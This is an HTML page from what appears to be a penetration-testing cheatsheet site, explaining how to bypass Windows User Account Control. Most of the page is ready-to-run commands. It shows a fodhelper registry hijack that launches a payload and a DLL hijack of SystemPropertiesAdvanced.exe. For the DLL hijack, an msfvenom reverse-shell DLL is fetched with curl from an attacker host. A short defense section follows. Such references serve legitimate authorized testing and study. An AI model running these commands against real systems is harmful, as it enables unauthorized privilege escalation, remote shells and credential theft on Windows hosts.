@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>UAC Bypass · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>UAC Bypass</h1><p class="cx-lede">Turning a filtered medium-integrity admin token into a full high-integrity one - User Account Control splits an admin&#x27;s logon into two tokens, and a command-line shell gets the filtered one. Bypass it by abusing an auto-elevating trusted binary - either a registry hijack (fodhelper / eventvwr / computerdefaults reading a user-writable key) or a DLL hijack of a missing DLL an auto-elevating binary loads from a writable PATH entry. UAC is explicitly not a security boundary.</p><div class="cx-tags"><span class="cx-tag">MITRE T1134, T1574.001, T1068</span><span class="cx-tag">D3FEND D3-PSA</span><span class="cx-tag">IMPACT PrivEsc</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>With UAC enabled and Admin Approval Mode on, an administrator's logon produces <strong>two tokens</strong> - a filtered medium-integrity one and a full high-integrity one. A command-line shell runs with the <em>filtered</em> token, so even as a local admin you can't do admin things until you elevate - and there's no CLI version of the consent prompt. The bypass is to get an <strong>auto-elevating trusted binary</strong> (one Windows elevates with no prompt) to run your code.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 0. Confirm you&#x27;re a filtered admin: in Administrators, but whoami /priv is short
+net localgroup administrators          # your user is listed
+whoami /priv                           # only ~5 privileges → medium token
+
+# 1. Fastest path - fodhelper.exe reads a user-writable registry key, then auto-elevates
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /d &quot;cmd.exe /c &lt;payload&gt;&quot; /f
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v DelegateExecute /f
+start fodhelper.exe                     # runs &lt;payload&gt; high-integrity, no prompt
+
+# 2. DLL-hijack path - an auto-elevating binary loads a missing DLL from a writable PATH dir
+#    (e.g. SystemPropertiesAdvanced.exe 32-bit → missing srrstr.dll)</code></pre></figure>
+<p>Success indicator: a process spawned by the auto-elevating binary runs at <strong>high</strong> integrity - <code>whoami /groups</code> shows <code>Mandatory Label\High Mandatory Level</code>, and <code>whoami /priv</code> now lists the full admin privilege set (<code>SeDebugPrivilege</code>, <code>SeTakeOwnershipPrivilege</code>, …) available to enable.</p>
+<h2 id="when-this-applies">When this applies</h2>
+<p>This is <strong>not</strong> a standard-user-to-admin escalation - you must already be in the local <code>Administrators</code> group. The problem UAC creates is that your interactive/remote shell holds the <em>filtered</em> token, so the admin membership is inert until you re-run code with the full token. Signals you're in this exact spot:</p>
+<ul>
+<li><code>net localgroup administrators</code> lists your user, but <code>whoami /priv</code> shows only the short medium-integrity privilege set (no <code>SeDebug</code>, <code>SeBackup</code>, etc.).</li>
+<li>You have a shell (RDP, WinRM, a reverse shell) rather than a desktop session where you could just click "Yes" on the prompt.</li>
+</ul>
+<p>The <strong>built-in RID 500 Administrator</strong> is the exception - it runs at high integrity by default (unless <code>FilterAdministratorToken</code> is enabled), so it needs no bypass.</p>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>Microsoft is explicit that UAC is a convenience feature, <strong>not a security boundary</strong> - bypasses are "won't fix" by design. It still matters operationally: elevating is an extra, noisier step, and a well-configured host (<code>ConsentPromptBehaviorAdmin = 0x2</code>, "Always Notify" on the secure desktop) closes many bypasses.</p>
+</div>
+<h2 id="enumerate-the-uac-state">Enumerate the UAC state</h2>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Is UAC on at all?
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+#   EnableLUA = 0x1  → UAC enabled
+
+# How aggressive is the prompt? (fewer bypasses at the highest level)
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+#   0x2 = Always Notify, consent on secure desktop (hardest)
+#   0x5 = DEFAULT - prompt for consent for non-Windows binaries; still auto-elevates Windows binaries
+#   0x0 = elevate silently (easiest)
+
+# Which Windows build? UAC bypasses are build-specific
+[environment]::OSVersion.Version          # e.g. 10.0.14393 → Windows 10 release 1607</code></pre></figure>
+<p>The <a href="https://github.com/hfiref0x/UACME">UACME project</a> is the reference catalog: it maps each bypass technique to the Windows build range it works on and whether Microsoft has since patched it. Match your build to a technique before trying one.</p>
+<h2 id="family-1-registry-hijack-of-an-auto-elevating-binary">Family 1 - registry hijack of an auto-elevating binary</h2>
+<p>Several trusted binaries auto-elevate <em>and</em> resolve a program to run from a <strong>per-user (<code>HKCU</code>) registry key</strong> - which an unprivileged process can write. Point the key at your payload, launch the binary, and your command runs high-integrity with no prompt. <code>fodhelper.exe</code> is the classic (Windows 10+):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /d &quot;cmd.exe /c C:\temp\rev.exe&quot; /f
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v DelegateExecute /f
+start fodhelper.exe</code></pre></figure>
+<p><code>fodhelper</code> opens the <code>ms-settings:</code> handler, finds your <code>HKCU</code> command, and executes it elevated. Clean up the key afterward (<code>reg delete "HKCU\Software\Classes\ms-settings" /f</code>). Equivalent binaries and their keys:</p>
+<table>
+<thead>
+<tr>
+<th>Binary</th>
+<th>Registry key it reads</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>fodhelper.exe</code></td>
+<td><code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code></td>
+</tr>
+<tr>
+<td><code>computerdefaults.exe</code></td>
+<td><code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code></td>
+</tr>
+<tr>
+<td><code>eventvwr.exe</code></td>
+<td><code>HKCU\Software\Classes\mscfile\shell\open\command</code> (patched post-1703)</td>
+</tr>
+<tr>
+<td><code>sdclt.exe</code></td>
+<td><code>HKCU\Software\Classes\Folder\shell\open\command</code> / <code>exefile</code> variants</td>
+</tr>
+</tbody>
+</table>
+<p>These leave registry artifacts and are heavily signatured by EDR - but they're one-shot and need no file drop.</p>
+<h2 id="family-2-dll-hijack-of-an-auto-elevating-binary">Family 2 - DLL hijack of an auto-elevating binary</h2>
+<p>Some auto-elevating binaries load a DLL <strong>by name</strong> that doesn't exist, and search a directory you can write to. Plant that DLL and it loads elevated. The writeup's canonical case: the 32-bit <code>SystemPropertiesAdvanced.exe</code> tries to load a missing <code>srrstr.dll</code>, and its search order includes <code>C:\Users\&lt;you&gt;\AppData\Local\Microsoft\WindowsApps</code> - which is in <code>%PATH%</code> and user-writable.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># 1. Confirm WindowsApps is in PATH (writable, user profile)
+cmd /c echo %PATH%            # ...\AppData\Local\Microsoft\WindowsApps;
+
+# 2. Build a payload DLL (DllMain runs on load)
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ATTACKER&gt; LPORT=8443 -f dll &gt; srrstr.dll
+
+# 3. Drop it where the binary will look
+curl http://&lt;ATTACKER&gt;:8080/srrstr.dll -o &quot;C:\Users\&lt;you&gt;\AppData\Local\Microsoft\WindowsApps\srrstr.dll&quot;
+
+# 4. Trigger the 32-bit auto-elevating binary
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</code></pre></figure>
+<p>The listener returns a <strong>high-integrity</strong> shell. See <a href="../dll-hijacking/index.html">DLL hijacking</a> for the search-order mechanics this relies on - UAC bypass is just that technique aimed at an auto-elevating target. (Confirm your DLL runs at all first by invoking it directly: <code>rundll32 shell32.dll,Control_RunDLL C:\...\WindowsApps\srrstr.dll</code> - that returns a <em>medium</em> shell, proving the DLL works before you fire the elevated trigger. Kill stray <code>rundll32</code> processes between attempts.)</p>
+<h2 id="after-the-bypass">After the bypass</h2>
+<p>The elevated shell often shows admin privileges as <em>Disabled</em> rather than removed - they're present in the high token and can be enabled on demand (see <a href="../setakeownership/index.html">SeTakeOwnership</a> and the other privilege pages for enabling a specific one). From a high-integrity context you can dump credentials, write to protected locations, and install services - the medium-token restrictions are gone.</p>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Set <code>ConsentPromptBehaviorAdmin</code> to <strong>Always Notify</strong> (<code>0x2</code>) and, for the built-in admin, enable <code>FilterAdministratorToken</code> - this closes the "RID 500 is already high" gap and the quieter bypass levels.</li>
+<li>UAC is not a boundary: don't rely on it to contain a local admin. Treat any account in <code>Administrators</code> as effectively already elevated when modeling risk.</li>
+<li>EDR signatures the registry-hijack binaries (<code>fodhelper</code>/<code>eventvwr</code> spawning <code>cmd</code>/<code>powershell</code>) and anomalous DLL loads from user-writable <code>PATH</code> dirs - alert on both.</li>
+<li>Keep <code>WindowsApps</code> and every <code>PATH</code> entry out of a privileged process's writable search path; patch to current builds (UACME techniques are build-pinned and many are fixed).</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../dll-hijacking/index.html">DLL hijacking</a> - the search-order abuse behind Family 2</li>
+<li><a href="../weak-permissions/index.html">Weak service &amp; registry permissions</a> - other "run my code as a privileged identity" paths</li>
+<li><a href="../initial-enumeration/index.html">Initial enumeration</a> - confirming build number and admin membership first</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../dll-hijacking/index.html">Previous: DLL Hijacking</a><a class="cx-next" href="../credential-hunting/index.html">Next: Credential Hunting</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
